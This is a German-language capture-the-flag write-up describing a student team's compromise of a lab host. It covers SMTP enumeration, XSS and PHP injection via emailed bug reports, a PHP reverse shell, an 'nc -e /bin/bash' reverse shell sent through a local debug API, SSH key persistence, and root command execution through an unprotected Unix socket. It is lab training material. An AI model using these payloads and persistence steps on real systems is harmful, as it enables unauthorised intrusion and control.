---
title: "Cyber2 CTF3-Report"
titlepage: true
toc-own-page: true
# date: "2024-11-21"
author: [Elias Gmünder, Timo Gafner, David Jäggli]
affiliation: [Affiliation1, Affiliation2]
date: '\today'
keywords: [Cyber2, CTF3, Report]
lang: de
geometry: margin=1in
fontsize: 12pt
...


# CTF3 Report 

Dieser Bericht dokumentiert die Analyse und Ausnutzung der Schwachstellen des CTF3-Ziels. Ausgangspunkt war ein Hinweis aus dem vorherigen CTF (CTF2), der zur Domain Riften.robstargames.com mit der zugehörigen IP-Adresse 192.168.22.65 führte. Unser Ziel war es, die verschiedenen Sicherheitslücken zu identifizieren, auszunutzen und schrittweise Zugriff auf Benutzer- und Root-Rechte zu erlangen.


## Hinweise aus CTF2

Ein Powershell-Command aus der vorherigen Challenge deutete auf einen neuen Zielserver hin:

``` {.powershell}
Get-SCPFolder -ComputerName 'Riften.robstargames.com' -Credential $credential -LocalFolder 'C:\backups\' -RemoteFolder '/var/mail/bugs'
```

Die zugehörige IP-Adresse zur Domain lautet: `192.168.22.65`.

\newpage

## Recon

Mit einem `nmap`-Scan wurde die Zielmaschine auf offene Ports und laufende Dienste geprüft:

```.shell!
$ nmap -sC -sV -T4 192.168.22.65

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 10:57 CET
Nmap scan report for Riften.robstargames.com (192.168.22.65)
Host is up (0.00082s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION                                                                                                                       
22/tcp   open   ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)                                                                                 
| ssh-hostkey: 
|   256 cf:65:ea:eb:9b:ca:11:7a:66:1e:1e:ae:d4:85:b1:c1 (ECDSA)
|_  256 35:9c:ce:2a:a4:d3:74:49:11:f4:dd:85:9c:07:78:34 (ED25519)
25/tcp   open   smtp    Postfix smtpd
|_smtp-commands: Riften, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=Riften
| Subject Alternative Name: DNS:Riften
| Not valid before: 2024-09-18T10:16:51
|_Not valid after:  2034-09-16T10:16:51
|_ssl-date: TLS randomness does not represent time
80/tcp   open   http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp  closed https
3000/tcp open   http    Node.js (Express middleware)
|_http-title: Debugging Console
Service Info: Host:  Riften; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.37 seconds

```

\newpage

### Ergebnisse

Die nachfolgende Tabelle bietet eine Zusammenfassung der identifizierten Ports sowie erste Gedanken zu potenziellen Schwachstellen.

\renewcommand{\arraystretch}{1.5}
\begin{table}[h]
	\centering
    \begin{tabular}{ | m{2em}  | m{3em} | m{3em} | m{10em} | m{15em} | } 
        \hline
        Port    & State     & Service       & Version/Details   & Notes \\
        \hline
        22      & Open      & SSH           & OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)    & Notes \\
        \hline
        25      & Open      & SMTP          & Postfix smtpd                                    & Test for email enumeration (VRFY, smtp\_enum) or misconfigurations. \\
        \hline
        80      & Open      & HTTP          & nginx 1.22.1                                     & Enumerate web directories/files; check default pages oder hidden content. \\
        \hline
        443     & closed    & HTTPS         &                                                  & Zurzeit nicht verfügbar.\\
        \hline
        3000    & Open      & HTTP          & Node.js (Express middleware)                     & Debugging Console; Potential für Code-Execution oder Info-Leaks. Führt Befehle aus, jedoch nur von `localhost`. Potenziell nützlich für Privilege Escalation. \\
        \hline
    \end{tabular}
	\caption{Offene Ports und erste Annahmen}
	\label{tab:Ports and suggestions}
\end{table}

### Mail-Service

Mit Hilfe von `msfconsole` und `smtp-user-enum` wurden 30 verschiedene, mögliche Benutzer identifiziert


Der Metasploit scanner wurde mit folgenden Optionen ausgeführt:

```.shell!
msf6 > msfconsole 
msf6 > use scanner/smtp/smtp_enum
msf6 auxiliary(scanner/smtp/smtp_enum) > options
msf6 auxiliary(scanner/smtp/smtp_enum) > set rhosts 192.168.22.65
msf6 auxiliary(scanner/smtp/smtp_enum) > run
[*] 192.168.22.65:25      - 192.168.22.65:25 Banner: 220 Riften ESMTP Postfix (Debian/GNU)
[+] 192.168.22.65:25      - 192.168.22.65:25 Users found: , _apt, backup, bin, daemon, games, irc, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, systemd-network, systemd-timesync, uucp, www-data
[*] 192.168.22.65:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


Zusätzlich wurde noch das smtp-user-enum tool als zweite Quelle verwendet:

```.shell!
$ smtp-user-enum -M VRFY -U /usr/share/wordlists/wfuzz/general/megabeast.txt -t 192.168.22.65                                      

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/wfuzz/general/megabeast.txt
Target count ............. 1
Username count ........... 45459
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Nov 23 11:16:12 2024 #########
192.168.22.65: backup exists
192.168.22.65: Backup exists
192.168.22.65: bin exists
192.168.22.65: bugs exists
192.168.22.65: daemon exists
192.168.22.65: games exists
192.168.22.65: list exists
192.168.22.65: mail exists
192.168.22.65: man exists
192.168.22.65: NeWS exists
192.168.22.65: postfix exists
192.168.22.65: postmaster exists
192.168.22.65: Prometheus exists
192.168.22.65: proxy exists
192.168.22.65: root exists
######## Scan completed at Sat Nov 23 11:29:45 2024 #########
15 results.

45459 queries in 813 seconds (55.9 queries / sec)
```


\newpage

## Ausnutzung des Mail-Service (Foothold Flag)

Auf der Startseite wurde folgender Text entdeckt:

> "Hier werden alle Bug Reports, welche an bugs@robstargames.com gesendet werden, angezeigt. Alle 5 Minuten wird der E-Mail Spooler gelöscht, damit wir nicht von Bug-Meldungen überschwemmt werden."


### Versuch 1: Senden einer einfachen E-Mail

Ein Test mit dem Tool sendemail zeigte, dass gesendete Nachrichten korrekt angezeigt werden:

```.shell!
sendemail -f 69420@example.com -t bugs@robstargames.com -u 'Subject' -m 'YadaYada' -s 192.168.22.65 -o tls=no
```

Die Option `-o tls=no` ist notwendig, um das Problem des nicht-vertauenswürdigen Zertifikat zu vermeiden. Besucht man danach wieder die Website sieht man die Nachricht \"YadaYada\" 
inklusive allen E-Mail Metadaten:

```.shell!
# start of mail spooler
From 69420@example.com  Sat Nov 23 11:17:46 2024
Return-Path: <69420@example.com>
X-Original-To: bugs@robstargames.com
Delivered-To: bugs@robstargames.com
Received: from alduin (unknown [192.168.156.158])
	by Riften (Postfix) with ESMTP id 3947160723
	for ; Sat, 23 Nov 2024 11:17:46 +0100 (CET)
Message-ID: <642872.356434481-sendEmail@alduin>
From: "69420@example.com" <69420@example.com>
To: "bugs@robstargames.com" 
Subject: Subject
Date: Sat, 23 Nov 2024 10:17:42 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-180533.565887348"
This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
------MIME delimiter for sendEmail-180533.565887348
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

YadaYada

------MIME delimiter for sendEmail-180533.565887348--
```

### Versuch 2: Script Injection

**Ziel:** Prüfen, ob der Mechanismus zur Anzeige von E-Mails auf der Webseite anfällig für Script-Injection oder unsachgemässe Eingabeverarbeitung ist.

```.shell!
$ sendemail -f "attacker@example.com" -t "bugs@robstargames.com" -u "<script>alert('xss')</script>" -m "<h1>Test HTML injection</h1>" -s 192.168.22.65:25 -o tls=no
```

Und tatsächlich werden sowohl der Alert wie ausgelöst, wie auch der Text im h1-tag als Überschrift dargestellt.


### Versuch 3: PHP-Code-Execution

Als nächstes wurde getestet, ob PHP-Code auch ausgeführt wird. Dazu wurde ein einfacher PHP `echo` verwendet.

```.shell!
$ sendemail -f "attacker@example.com" -t "bugs@robstargames.com" -u "Subject" -m "<?php echo 'test'; ?>" -s 192.168.22.65:25 -o tls=no
```

Es wird tatsächlich nur "test" angezeigt und nicht der komplette PHP-code.


### Exploit: PHP-Reverse-Shell

Als Exploit wurde eine generierte Reverse-Shell von [revshells.com](https://revshells.com)(PentestMonkey
version) auf port `9000` verwendet. Um das Senden zu vereinfachen wurde die PHP-reverse-Shell in eine Datei namens revshell.php gepackt. So kann diese im Kommando `cat` verwendet werden und der Befehl wird nicht unnötig lang.


1. Start eines netcat-listener auf port 9000 auf der Angreifermaschine

```.shell!
nc -lvnp 9000
```

2. Sende PHP-Exploit (gespeichert in `revshell.php`) mit `sendmail`

```.shell!
sendemail -f 69420@example.com -t bugs@robstargames.com -u 'Subject' -m "$(cat revshell.php)" -s 192.168.22.65 -o tls=no
```

3. Website aktualisiern: Die reverse-Shell wird erfolgreich ausgelöst. Information zum Benutzer: `whoami` zeigt angemeldeter Benutzer ist `www-data`.
4. Das erste flag ist direkt im selben Ort wie der Einstiegsort, der reverse-Shell.

Foothold Flag `foothold.txt`


## Benutzerrechte eskalieren (User Flag)

### Analyse des Webservice auf Port `3000`

Da der Dienst auf Port 3000 nur lokale Befehle erlaubt, wurde er aus der reverse-Shell heraus untersucht (als Beutzer `www-data`).

Da der Code zur Webshell im Benutzerverzeichnis liegt (`/home/stormcloak/webshell`), ist davon auszugehen, dass der Service mit anderen Benutzerrechten läuft als `www-data`. Sollte der Service verwundbar sein, ist somit eventuell eine Privilege Escalation zum Benutzer Stormcloak möglich.

Eine POST-Request an `/api/v1/command` erlaubte nun die Ausführung von Befehlen, da die Request mit der reverse-Shell von localhost aus ausgeführt werden konnte.
Wie in der JS-Datei entdeckt wurde, muss der parameter `validated=1`gesetzt werden. Ansonsten wird die Request zurückgewiesen. Ein Beispiel mit dem Befehl `id` sieht daher so aus:

```.shell!
curl localhost:3000/api/v1/command -X POST -d "command=id&validated=1"
```

### Reverse-Shell mit `curl`

Der nächste Schritt ist nun mit dem POST-Parameter im `curl`-request eine reverse-Shell aufzubauen. In dieser zweiten reverse-Shell sollten dann alle Rechte vom Benutzer stormcloak zur Verfügung stehen. Die reverse-Shell kam dieses mal mit dem Tool `netcat` von beiden Seiten aus zustande.

1. Starten von `netcat`-listener auf `192.168.22.65:9002`:

```.shell!
nc -lvnp 9002
```

2. Erneute reverse-Shell via `curl`:

```.shell!
curl localhost:3000/api/v1/command -X POST -d "command=nc+-e+/bin/bash+192.168.22.65+9003&validated=1"
```

Dabei sei zu beachten, dass alle Leerzeichen durch +-Zeichen ersetzt werden müssen, damit beim web-request nichts falsch interpretiert wird.

**Resultat:** Erfolgreich, Zugriff als Benutzer stormcloak.
**Gefundenes Flag:** User Flag 'user.txt'.


\newpage

### SSH-Access für eine stabile Verbindung einrichten.

1. SSH Key Pair generieren auf der lokalen Kali-VM:

```.shell!
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
```

2. Public Key `id_rsa.pub` auf der Zielmaschine `192.168.22.65` hinzufügen.

```.shell!
echo "<public_key>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

3. Über `ssh` mit `stormcloak@192.168.22.65` verbinden.

```.shell!
ssh stormcloak@192.168.22.65
```

Dies hat sich aber als kontraproduktiv erwiesen, da die festgesetzte Shell vom Benutzer stormcloak [rbash](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) ist. Diese Shell wird verwendet sobald man sich mit dem Benutzer stormcloak (unter anderem über SSH) anmeldet. Somit sind mögliche Aktionen viel weiter eingeschränkt als in der reverse-Shell. Zum Beispiel kann nichts ausgeführt werden, was nicht im Path ist. Daher wurde nachfolgend alle Kommandos für die Zielmaschine innerhalb der reverse-Shell und nicht in einer SSH-session ausgeführt. Ein Vorteil ist jedoch, dass nun das Tool `scp` für den Dateientransfer benutzt werden kann.


## Root Flag (Python Script)

Der erste Schritt, wie so oft, war herauszufinden, ob das linpeas-Skript etwas Nützliches findet. Wie bereits erwähnt, kann nun das `scp` tool verwendet werden, ohne ein Passwort einzugeben, dank dem gespeicherten Public-Key.

```.shell!
scp ./linpeas.sh stormcloak@192.168.22.65:/home/stormcloak
```

Danach auf der Zielmaschine in der reverse-Shell:

```.shell!
chmod +x ./linpeas.sh
./linpeas.sh
```

Das Erste, was ins Auge springt, ist dabei, die offensichtlichste Schwachstelle, welche von linpeas rot-gelb hervorgehoben wurde:
Es ist möglich in system-PFAD Ordner zu schreiben. Dies könnte zum Beispiel ausgenutzt werden, wenn eine Datei mit erhöhten Privilegien ausgeführt wird, welche eine nicht-absolute Abhängigkeit hat.
Sollte zum Beispiel ein ausführbares Skript von root, intern den Befehl `cat` (ohne absoluten Pfad) brauchen, könnte eine eigene `cat`-Datei in einem der beschreibbaren PATH-Ordner erstellt werden und es würde diese Datei bevorzugen gegenüber dem ursprünglichen `cat`-Befehl.
Eine ausführbare Datei von root, welche eine solche Abhängigkeit hat, wurde jedoch nicht gefunden, weshalb weiter der restliche Output vom linpeas-Skript analysiert wurde.

Schliesslich wurde dadurch das Python-Script `/opt/cloak.py` gefunden, welche dem Benutzer root gehört. Damit das ganze etwas übersichtlicher ist, wurden nur die essentiellen
Linien dargestellt.


```.python
[...]
socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket.bind("/run/cloak.sock")
os.system("chmod o+w /run/cloak.sock")

while True:
    socket.listen(1)
    connection, address = socket.accept()
    [...]
    if(hashlib.sha256(data.decode().strip().encode()).hexdigest() == hash):
        [...]
        while True:
            [...]
            data = connection.recv(1024)

            if data:
                returncode = os.system(data)
                    
    [...]
```

In diesem Skript ist ersichtlich, dass nach der Eingabe des korrekten Passwords, alle Strings, welche an den `/run/cloak.sock` Socket geschickt werden, als System-Kommandos ausgeführt werden. Inspiziert man alle laufenden Python-prozesse, ist ersichtlich, dass ebendieses Skript von root ausgeführt wurde:

```.shell!
stormcloak@Riften:~$ ps aux | grep python3
root         888  0.0  0.9  21716  9440 ?        Ss   Nov07   0:00 /usr/bin/python3 /opt/cloak.py
stormcl+   85158  0.0  0.2   6332  2104 pts/1    S+   12:53   0:00 grep python3
```

Das Passwort wurde im Skript als Hash gespeichert. Der Kommentar weist jedoch darauf hin, dass das Debugpasswort aus dem Heimverzeichnis von Stormcloak verwendet werden kann. Und bei der Eingabe wird tatsächlich das Passwort `snakesnakefish!` aus der Datei `/home/stormcloak/debugpassword.txt` akzeptiert.


\newpage

### Ausnützen des Unix-Sockets

Zuerst muss eine Verbindung mit dem Socket hergestellt werden. Dafür gibt es verschiedene Möglichkeiten, in diesem Fall wird das Tool `socat` verwendet, da es vorinstalliert und die Benutzung simpel ist:

```.shell!
socat - UNIX-CONNECT:/run/cloak.sock
```

Da alle Eingaben nun als Kommandos als Benutzer root ausgeführt werden, kann nun das letzte Flag ausgelesen werden. Dies geht jedoch nicht direkt mit einem Kommando wie `cat`, da der Output des Kommandos nicht zu sehen ist. Eine Möglichkeit ist es den Output in eine neue Datei weiterzuleiten, da so standardweise eine Datei erstellt wird, welcher von 'other' respektive von allen lokalen Benutzern gelesen werden kann.
Um die Verbindung mit dem Socket zu unterbrechen, kann ein ungültiger Befehl eingegeben werden, in diesem Fall 'asdf'.
```.shell!
cat /root/root.txt > /home/stormcloak/out
command executed!
enter command: asdf
asdf
an error has occured..
stormcloak@Riften:~$ cat ./out
cat ./out
Your flag is: 8e9e8455f6840e45e8c12798e7a47bf2 
```

**Gefundenes Flag:** root-Flag `/root/root.txt`


### SSH-Access für eine stabile Verbindung einrichten.

Für persistenz und einfacheren Zugriff, wurde bei root genau gleich wie beim Benutzer stormcloak, der eigene Public-Key für eine SSH Verbindung hintelegt.

Public-Key `id_rsa.pub` nach`/root/.ssh/authorized_keys` kopieren.

```.shell!
stormcloak@Riften:~$ socat - UNIX-CONNECT:/run/cloak.sock
Welcome to the debug socket!
Please provide your password: snakesnakefish!
password accepted!
enter command: echo "<public_key>" >> /root/.ssh/authorized_keys
command executed!
enter command: chmod 600 /root/.ssh/authorized_keys
command executed!
```

Über `ssh` mit `root@192.168.22.65` verbinden:

```.shell!
ssh stormcloak@192.168.22.65
```

Als root steht nun auch eine voll funktionsfühige BASH-shell zur Verfügung statt rbash, wie beim Benutzer stormcloak.


## Hinweise für CTF4?

In `/home/stormcloak/.git/config` wurde der vermutliche Name des nächsten Ziels gefunden:

```yaml!
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = git@gitlab.robstargames.com:stormcloak/list-of-spies.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

Die Domäne gitlab.robstargames.com war bis jetzt noch nie ein Ziel, daher die Annahme, dass dies das nächste Ziel sein könnte.
